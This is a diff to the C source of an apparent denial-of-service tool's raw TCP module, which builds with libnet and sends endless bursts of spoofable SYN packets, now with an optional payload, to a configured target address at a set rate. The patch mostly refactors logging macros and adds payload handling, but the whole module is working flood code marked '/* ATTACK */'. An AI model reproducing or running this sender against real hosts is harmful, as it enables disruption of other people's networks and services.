@@ -25,13 +25,14 @@
 
 #include <config.h>
 
-#include "dosis.h"
 #include "dosconfig.h"
-#include "tcpraw.h"
-#include "lnet.h"
-#include "pthreadex.h"
-#include "log.h"
+#include "dosis.h"
 #include "ip.h"
+#include "lnet.h"
+#include "log.h"
+#include "payload.h"
+#include "pthreadex.h"
+#include "tcpraw.h"
 #include "tea.h"
 
 typedef struct _tag_TCPRAW_CFG {
@@ -42,9 +43,9 @@ typedef struct _tag_TCPRAW_CFG {
 
   /* parameters */
   unsigned           npackets;
-  char               req;
-  unsigned           req_size;
   double             hitratio;
+  char              *payload;
+  unsigned           payload_size;
 
   /* other things */
   pthreadex_timer_t  timer;
@@ -56,34 +57,15 @@ typedef struct _tag_TCPRAW_CFG {
 #define tcp_header(x)  ((struct tcphdr *) ((x) \
                        + (((struct iphdr *) (x))->ihl << 2)))
 
+/*****************************************************************************
+ * THREAD IMPLEMENTATION
+ *****************************************************************************/
+
 static int tcpraw__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
 {
   TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
 
   /* check msg size and headers */
-DBG("[%s] size       = %d", tw->methods->name, size);
-if(size >= sizeof(struct iphdr))
-{
-DBG("[%s] ip proto   = %d", tw->methods->name, ip_protocol(msg));
-if(ip_protocol(msg) == 6)
-{
-DBG("[%s] iphdr size = %d", tw->methods->name, sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2));
-if(size >= sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
-{
-DBG("[%s] saddr:srcp = %x:%d (%x:%d)", tw->methods->name, ip_header(msg)->saddr, ntohs(tcp_header(msg)->source), tc->shost.addr.in.addr, tc->shost.port);
-DBG("[%s] daddr:dstp = %x:%d (%x:%d)", tw->methods->name, ip_header(msg)->daddr, ntohs(tcp_header(msg)->dest),   tc->dhost.addr.in.addr, tc->dhost.port);
-DBG("[%s] flags(fin) = %x", tw->methods->name, tcp_header(msg)->fin);
-DBG("[%s] flags(syn) = %x", tw->methods->name, tcp_header(msg)->syn);
-DBG("[%s] flags(rst) = %x", tw->methods->name, tcp_header(msg)->rst);
-DBG("[%s] flags(psh) = %x", tw->methods->name, tcp_header(msg)->psh);
-DBG("[%s] flags(ack) = %x", tw->methods->name, tcp_header(msg)->ack);
-DBG("[%s] flags(urg) = %x", tw->methods->name, tcp_header(msg)->urg);
-DBG("[%s]   VEREDICT: %d", tw->methods->name, ip_header(msg)->saddr == tc->dhost.addr.in.addr
-                        && ntohs(tcp_header(msg)->source) == tc->dhost.port);
-}
-}
-}
-
   if(size < sizeof(struct iphdr)
   || ip_protocol(msg) != 6
   || size < sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
@@ -101,7 +83,7 @@ static void tcpraw__thread(THREAD_WORK *tw)
   unsigned int seq = libnet_get_prand(LIBNET_PRu32);
   int i;
 
-  DBG("[%02u] Started sender thread", tw->id);
+  TDBG("Started sender thread");
 
   /* ATTACK */
   while(1)
@@ -109,28 +91,30 @@ static void tcpraw__thread(THREAD_WORK *tw)
     /* wait for work */
     if(tc->hitratio > 0)
       if(pthreadex_timer_wait(&(tc->timer)) < 0)
-        ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));
+        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));
 
     /* build TCP packet with payload (if requested) */
-    DBG("[%02u] Sending %d packet(s)...", tw->id, tc->npackets);
+    TDBG("Sending %d packet(s)...", tc->npackets);
     for(i = 0; i < tc->npackets; i++)
     {
       seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-      ln_send_packet(tc->lnc,
-                     &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                     TH_SYN, 13337,
-                     seq, 0,
-                     NULL, 0);
+#warning "Set flags"
+#warning "Set window"
+      ln_send_tcp_packet(tc->lnc,
+                         &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
+                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                         TH_SYN, 13337,
+                         seq, 0,
+                         (char *) tc->payload, tc->payload_size);
     }
   }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * GENERIC HHTP THREAD
- *   This thread specializes in different tasks depending on thread number
- *     0 - listener
- *     x - sender
+ * CONFIGURATION. 
+ *   Is important to consider that this function could be
+ *   called several times during thread live: initial
+ *   configuration and reconfigurations.
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
 static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
@@ -144,13 +128,13 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
   if(tc == NULL)
   {
     if((tc = calloc(1, sizeof(TCPRAW_CFG))) == NULL)
-      D_FAT("[%02d] No memory for TCPRAW_CFG.", tw->id);
+      TFAT("No memory for TCPRAW_CFG.");
     tw->data = (void *) tc;
 
     /* initialize libnet */
-    DBG("[%02u] Initializing libnet.", tw->id);
+    TDBG("Initializing libnet.");
     if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
-      D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
+      TFAT("No memory for LN_CONTEXT.");
     ln_init_context(tc->lnc);
 
     pthreadex_timer_init(&(tc->timer), 0.0);
@@ -159,17 +143,14 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
   /* read from SNODE command parameters */
   cn = command->command.thc.to->to.pattern;
   if(cn->type != TYPE_PERIODIC)
-    FAT("%d: Uknown pattern %d.", cn->line, cn->type);
+    TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
   
   tc->hitratio = tea_get_float(cn->pattern.periodic.ratio);
   tc->npackets = tea_get_int(cn->pattern.periodic.n);
-  tc->req_size = tea_get_int(cn->pattern.periodic.bytes);
   if(tc->hitratio < 0)
-    FAT("%d: Bad hit ratio '%f'.", cn->line, tc->hitratio);
+    TFAT("%d: Bad hit ratio '%f'.", cn->line, tc->hitratio);
   if(tc->npackets <= 0)
-    FAT("%d: Bad number of packets '%d'.", cn->line, tc->npackets);
-  if(tc->req_size <= 0)
-    FAT("%d: Bad packet size '%d'.", cn->line, tc->req_size);
+    TFAT("%d: Bad number of packets '%d'.", cn->line, tc->npackets);
 
   /* read from SNODE command options */
   for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
@@ -178,7 +159,7 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
       case TYPE_OPT_SRC:
         s = tea_get_string(cn->option.addr);
         if(ip_addr_parse(s, &tc->shost))
-          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
+          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
         free(s);
         if(cn->option.port)
           ip_addr_set_port(&tc->shost, tea_get_int(cn->option.port));
@@ -187,7 +168,7 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
       case TYPE_OPT_DST:
         s = tea_get_string(cn->option.addr);
         if(ip_addr_parse(s, &tc->dhost))
-          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
+          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
         free(s);
         if(cn->option.port)
           ip_addr_set_port(&tc->dhost, tea_get_int(cn->option.port));
@@ -206,13 +187,19 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
             case 'S': tc->flags |= 0x02; break; /* syn    */
             case 'F': tc->flags |= 0x01; break; /* fin    */
             default:
-              FAT("%d: Unknown TCP flag '%c'.", cn->line, s[i]);
+              TFAT("%d: Unknown TCP flag '%c'.", cn->line, s[i]);
           }
         free(s);
         break;
 
+      case TYPE_OPT_PAYLOAD_FILE:
+      case TYPE_OPT_PAYLOAD_RANDOM:
+      case TYPE_OPT_PAYLOAD_STR:
+        payload_get(cn, &tc->payload, &tc->payload_size);
+        break;
+
       default:
-        FAT("%d: Uknown option %d.", cn->line, cn->type);
+        TFAT("%d: Uknown option %d.", cn->line, cn->type);
     }
 
   /* configure timer */
@@ -221,7 +208,7 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
 
   /* configure src address (if not defined) */
   if(tc->dhost.type == INET_FAMILY_NONE)
-    FAT("I need a target address.");
+    TFAT("I need a target address.");
   if(tc->shost.type == INET_FAMILY_NONE)
   {
     DOS_ADDR_INFO *ai;
@@ -229,7 +216,7 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
     {
       char buff[255];
       ip_addr_snprintf(&tc->shost, sizeof(buff), buff);
-      WRN("Cannot find a suitable source address for '%s'.", buff);
+      TWRN("Cannot find a suitable source address for '%s'.", buff);
     } else
       ip_addr_copy(&tc->shost, &ai->addr);
   }
@@ -238,15 +225,14 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
   {
     char buff[255];
 
-    DBG2("[%d] config.periodic.n     = %d", tw->id, tc->npackets);
-    DBG2("[%d] config.periodic.bytes = %d", tw->id, tc->req_size);
-    DBG2("[%d] config.periodic.ratio = %d", tw->id, tc->hitratio);
+    TDBG2("config.periodic.n     = %d", tc->npackets);
+    TDBG2("config.periodic.ratio = %d", tc->hitratio);
 
     ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
-    DBG2("[%d] config.options.shost  = %s", tw->id, buff);
+    TDBG2("config.options.shost  = %s", buff);
     ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
-    DBG2("[%d] config.options.dhost  = %s", tw->id, buff);
-    DBG2("[%d] config.options.flags  = %x", tw->id, tc->flags);
+    TDBG2("config.options.dhost  = %s", buff);
+    TDBG2("config.options.flags  = %x", tc->flags);
   }
 
   return 0;
@@ -261,10 +247,15 @@ static void tcpraw__cleanup(THREAD_WORK *tw)
   free(tc->lnc);
   pthreadex_timer_destroy(&tc->timer);
 
+  if(tc->payload)
+  {
+    free(tc->payload);
+    tc->payload = NULL;
+  }
   free(tc);
   tw->data = NULL;
 
-  DBG("[%d] Finalized.", tw->id);
+  TDBG("Finalized.");
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
